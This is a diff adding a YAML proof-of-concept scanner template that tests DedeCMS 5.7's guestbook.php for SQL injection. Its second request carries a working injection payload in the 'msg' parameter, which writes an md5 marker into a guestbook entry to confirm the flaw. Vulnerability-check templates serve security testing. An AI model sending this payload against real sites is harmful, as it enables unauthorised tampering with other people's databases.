@@ -1,0 +1,32 @@
+name: poc-yaml-dedecms-guestbook-sqli
+set:
+    r: {"function": "randomInt", "vars": "800000000, 1000000000"}
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /plus/guestbook.php
+            follow_redirects: true
+        expression_json: [{"function": "checkStatusCode", "vars": 200}]
+        output: [{"function": "searchRespByText", "vars": "action=admin&id=(?P<articleid>\\d{1,20})", "orders": ["articleid"]}]
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /plus/guestbook.php?action=admin&job=editok&id={{articleid}}&msg=',msg=@`'`,msg=(selecT md5({{r}})),email='
+            follow_redirects: true
+        expression_json: [{"function": "checkStatusCode", "vars": 200}]
+    r2:
+        request:
+            cache: true
+            method: GET
+            path: /plus/guestbook.php
+            follow_redirects: true
+        expression_json: [{"function": "checkStatusCode", "vars": 200}, 'and', {"function": "checkRespFromText", "vars": "{{r}}"}]
+expression: r0() && r1() && r2()
+detail:
+    author: harris2015(https://github.com/harris2015)
+    links:
+        - https://blog.csdn.net/god_7z1/article/details/8180454
+    Affected Version: "5.7"
